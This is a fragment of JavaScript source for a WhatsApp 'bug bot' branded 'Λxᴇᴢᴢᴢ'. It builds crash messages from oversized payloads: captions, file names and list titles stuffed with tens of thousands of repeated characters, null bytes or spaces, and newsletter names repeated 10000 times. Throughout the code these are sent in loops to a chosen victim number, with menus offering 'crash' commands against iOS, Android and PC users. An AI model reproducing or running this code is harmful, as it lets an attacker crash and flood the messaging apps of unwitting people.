...
let { key } = await rxhl.sendMessage(from, {text: '𝚂𝚃𝙰𝚁𝚃 Λxᴇᴢᴢᴢ 𝚅𝟽...'})
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `Λxᴇᴢᴢᴢ BUG WHATSAPP ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "ΛxᴇᴢᴢᴢCrash",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/a44504d8cb5a9a70939ea.jpg" } }, { upload: rxhl.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `Λxᴇᴢᴢᴢ DOCUMENT ✅`+"ྦྷ".repeat(60000),
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "Λxᴇᴢᴢᴢ MODS WHATSAPP" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'Λxᴇᴢᴢᴢ MODS WHATSAPP', url : , merchant_url :  }"
            }],
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'ΛxᴇᴢᴢᴢBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
                    ...
                    interactiveMessage: {
                        ...
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : 'Λxᴇᴢᴢᴢ', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : 'Λxᴇᴢᴢᴢ', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
...
const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `Λxᴇᴢᴢᴢ DEVELOPER 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@axezzz666`}}}, { quoted:m})} 
...
previewType: "VIDEO",
thumbnail: rxhlimage,
sourceUrl: `https://youtube.com/@axezzz666`,
mediaUrl: `https://youtube.com/@axezzz666`
}
},
text: teks
}, {
...
│☞ ${prefix}.𝙥𝙪𝙗𝙡𝙞𝙘
│☞ ${prefix}.𝙗𝙡𝙤𝙠 *1829XXX*
│☞ ${prefix}.𝙪𝙣𝙗𝙡𝙤𝙠 *1829XXX*
│☞ ${prefix}.𝙨𝙚𝙩𝙥𝙥𝙗𝙤𝙩 /𝙛𝙪𝙡𝙡
┗────────────────┛
┏──╴[ \`𝙈𝙚𝙣𝙪\` ] ───┓
│☞ ${prefix}.𝙗𝙪𝙜𝙢𝙚𝙣𝙪
┗──────────────`
...
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029ValKlUzCcW4lXikMn30K\",\"merchant_url\":\"https://whatsapp.com/channel/0029ValKlUzCcW4lXikMn30K\"}"
}
],
"messageParamsJson": ""
}
...
╰┓┗─────────
┏──╴[ \`𝘽𝙪𝙜 𝙞𝙥𝙝𝙤𝙣𝙚\` ] ───┓
│☞ ${prefix}.𝘾137_𝙞𝙤𝙨 *1829XXX*
│☞ ${prefix}.𝙉𝙪𝙣𝙚𝙯_𝙞𝙤𝙨 *1829XXX*
│☞ ${prefix}.𝘾𝙪𝙗𝙞𝙩𝙖_𝙞𝙤𝙨 *1829XXX*
│☞ ${prefix}.𝙉𝙪𝙣𝙚𝙯_𝙬𝙖𝙩𝙪𝙨𝙞 *1829XX*
┗──────────────
┏❐   \`📵WARNING!!\`
┃> _En los menús de errores crash1jam y crash1hari, no use el menú con demasiada frecuencia. porque este menú enviará muchos errores y te hará propenso a ser baneado.
┃
┗❐`
anuges = {
viewOnceMessage: {
...
╰┓┗──────────────────┛
┏──╴[ \`𝘽𝙐𝙂 𝘼𝙣𝙙𝙧𝙤𝙞𝙙\` ] ───┓
│☞ ${prefix}.𝘾137_𝙖𝙣𝙙𝙧𝙤𝙞𝙙   *1829X*
│☞ ${prefix}.𝘾𝙪𝙗𝙞𝙩𝙖_𝙞𝙣𝙢𝙪𝙣𝙚 *1829X*
│☞ ${prefix}.𝙉𝙪𝙣𝙚𝙯_𝙖𝙣𝙙𝙧𝙤𝙞𝙙 *1829X*
┗───────────`
anuges = {
viewOnceMessage: {
message: {
...
╰┓┗─────────
┏──╴[ \`𝘽𝙪𝙜 𝙥𝙘\` ] ────┓
│☞ ${prefix}.𝘾137_𝙥𝙘 *1829XXX*
│☞ ${prefix}.𝙉𝙪𝙣𝙚𝙯_𝙥𝙘 *1829XXX*
│☞ ${prefix}.𝘾𝙪𝙗𝙞𝙩𝙖_𝙥𝙘 *1829XXX*
┗─────────── `
anuges = {
viewOnceMessage: {
message: {
...
rxhl.relayMessage(from, anuges, {})
//by madaraCreatorMessageKKKK
await rxhl.sendMessage(from, { 
audio: fs.readFileSync('./lib/madara/madaraCreatorMessage.mp3'), 
mimetype: 'audio/mpeg',
"contextInfo": {"forwardingScore": 99999999,
"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `madara nė`,serverMessageId: 2 }}})
break
...
┏❐   \`Special Bug V1\`
┃
┃⭔ ${prefix}axezzzbug *628xxx|Amount*
┃⭔ ${prefix}axezzzkeren *628xxx|Amount*
┃⭔ ${prefix}axezzzganteng *628xxx|Amount*
┃⭔ ${prefix}axezzzios *628xxx|Amount*
┃⭔ ${prefix}axezzzandro *628xxx|Amount*
┃
┗❐
...
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY Λxᴇᴢᴢᴢ`);
});
}
...
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
await rxhl.sendMessage(Pe, { text: 'ΛxᴇᴢᴢᴢReaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `ΛxᴇᴢᴢᴢReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await rxhl.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Λxᴇᴢᴢᴢ`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Λxᴇᴢᴢᴢ`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `Λxᴇᴢᴢᴢ`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `Λxᴇᴢᴢᴢ`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `Λxᴇᴢᴢᴢ`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Succes 🥰*`)
}
...
await sleep(500)
rxhl.sendMessage(Pe, { text: 'Λxᴇᴢᴢᴢ Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `ΛxᴇᴢᴢᴢReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
rxhl.sendMessage(Pe, { "caption": `Λxᴇᴢᴢᴢ`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `Λxᴇᴢᴢᴢ`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
...
hohe = [
  {
   ...
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://www.youtube.com/@axezzz666",
      merchant_url: "https://www.youtube.com/@axezzz666"
   })
}
]
ewe = `${menuu}`
...
case 'axezzzbug': case 'axezzzkeren': case 'axezzzganteng': case 'axezzzlios': case 'axezzzlandro':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
...
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029ValKlUzCcW4lXikMn30K`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
...
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY Λxᴇᴢᴢᴢ`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
